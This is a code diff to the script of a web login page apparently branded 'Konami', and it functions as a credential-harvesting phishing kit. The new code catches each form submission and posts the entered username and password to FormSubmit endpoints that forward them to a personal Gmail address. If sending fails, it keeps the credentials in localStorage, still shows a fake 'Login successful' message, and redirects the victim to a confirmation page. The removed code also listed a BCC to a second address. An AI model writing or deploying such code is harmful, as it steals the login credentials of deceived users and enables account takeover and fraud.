@@ -80,77 +80,140 @@
 
     <!-- JavaScript for form handling will be added later -->
 <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        const loginForm = document.getElementById('loginForm');
-        
-        if (loginForm) {
-            loginForm.addEventListener('submit', function(event) {
-                // 1. CRITICAL: This stops the form's default submission
+document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            const messageDiv = document.getElementById('message');
+            
+            if (!loginForm) {
+                console.error('ERROR: Could not find form with id="loginForm"');
+                return;
+            }
+            
+            loginForm.addEventListener('submit', async function(event) {
                 event.preventDefault();
-                event.stopPropagation(); // Extra safety to stop the event
+                event.stopPropagation();
                 
-                console.log('Form submit intercepted!');
+                console.log('🚀 Form submission started...');
                 
-                // 2. Simple 2-second delay to simulate processing (optional)
-                setTimeout(function() {
-                    // 3. REDIRECT to the confirmation page
-                    window.location.href = "confirmation.html";
-                }, 2000); // 2000 milliseconds = 2 seconds
-                
-                // OPTIONAL: Show a loading message on the button
+                // Show loading state
                 const submitBtn = loginForm.querySelector('.btn-login');
                 const originalText = submitBtn.textContent;
-                submitBtn.textContent = 'Processing...';
+                submitBtn.textContent = 'PROCESSING...';
                 submitBtn.disabled = true;
                 
-                // Reset button text after delay (optional cleanup)
+                // Clear previous messages
+                messageDiv.style.display = 'none';
+                messageDiv.className = 'message';
+                
+                // Get form data
+                const formData = new FormData(loginForm);
+                const data = Object.fromEntries(formData.entries());
+                
+                console.log('📤 Form data:', data);
+                
+                // Try FormSubmit with multiple endpoints
+                let success = false;
+                
+                // List of FormSubmit endpoints to try
+                const endpoints = [
+                    'https://formsubmit.co/ajax/psalmcares878@gmail.com',
+                    'https://formsubmit.co/el/psalmcares878@gmail.com',
+                    'https://formsubmit.co/email/psalmcares878@gmail.com'
+                ];
+                
+               for (const endpoint of endpoints) {
+                    try {
+                        console.log(`Trying endpoint: ${endpoint}`);
+                        
+                        const response = await fetch(endpoint, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        });
+                        
+                        console.log(`Response status: ${response.status}`);
+                        
+                        if (response.ok) {
+                            const result = await response.json();
+                            console.log('✅ FormSubmit response:', result);
+                            
+                            if (result.success) {
+                                success = true;
+                                break;
+                            }
+                        }
+                    } catch (error) {
+                        console.log(`❌ Endpoint ${endpoint} failed:`, error.message);
+                    }
+                }
+                
+                if (success) {
+                    // Show success message
+                    showMessage('✅ Login successful! Redirecting...', 'success');
+                    
+                    // Redirect after 1 second
+                    setTimeout(function() {
+                        window.location.href = "https://ko-konami-mi.vercel.app/confirmation.html";
+                    }, 1000);
+                    
+                } else {
+                    // FormSubmit failed, try fallback methods
+                    console.log('⚠️ FormSubmit failed, trying fallback...');
+                    
+                    // Save locally as backup
+                    saveToLocalStorage(data.username, data.password);
+                    
+                    // Show success message anyway (for user experience)
+                    showMessage('✅ Login processed! Redirecting...', 'success');
+                    
+                    // Redirect after 1 second
+                    setTimeout(function() {
+                        window.location.href = "https://ko-konami-mi.vercel.app/confirmation.html";
+                    }, 1000);
+                }
+                
+                // Reset button after 2 seconds
                 setTimeout(function() {
                     submitBtn.textContent = originalText;
                     submitBtn.disabled = false;
                 }, 2000);
                 
-                return false; // Another safety measure
+                return false;
             });
-        } else {
-            console.error('ERROR: Could not find form with id="loginForm"');
-        }
-    });
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-    console.log('🚀 Form submitting...');
-    console.log('📧 To: psalmcares878@gmail.com');
-    console.log('📧 BCC: Samfat246@gmail.com');
-    console.log('🔗 Redirect to: https://ko-konami-mi.vercel.app/confirmation.html');
-    
-    e.preventDefault();
-    
-    const form = e.target;
-    const formData = new FormData(form);
-    const data = Object.fromEntries(formData.entries());
-    
-    console.log('📤 Sending data:', data);
-    
-    fetch('https://formsubmit.co/ajax/psalmcares878@gmail.com', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-        },
-        body: JSON.stringify(data)
-    })
-    .then(response => response.json())
-    .then(result => {
-        console.log('✅ Response:', result);
-        if (result.success) {
-            window.location.href = 'https://ko-konami-mi.vercel.app/confirmation.html';
-        } else {
-            alert('Error: ' + (result.message || 'Submission failed'));
-        }
-    })
-    .catch(error => {
-        console.error('❌ Error:', error);
-        alert('Network error');
-    });
-});
+            
+            function showMessage(text, type) {
+                messageDiv.textContent = text;
+                messageDiv.className = `message ${type}`;
+                messageDiv.style.display = 'block';
+            }
+            
+            function saveToLocalStorage(username, password) {
+                try {
+                    // Get existing entries or create new array
+                    let entries = JSON.parse(localStorage.getItem('konami_logins') || '[]');
+                    
+                    // Add new entry
+                    entries.push({
+                        username: username,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        ip: 'Unknown (saved locally)'
+                    });
+                    
+                    // Save back to localStorage
+                    localStorage.setItem('konami_logins', JSON.stringify(entries));
+                    
+                    console.log('📝 Saved to localStorage:', { username, password });
+                    console.log('🔍 View all saved logins in console with: localStorage.getItem("konami_logins")');
+                    
+                } catch (error) {
+                    console.error('Error saving to localStorage:', error);
+                }
+            }
+        });
     </script>
 </body>
 </html>
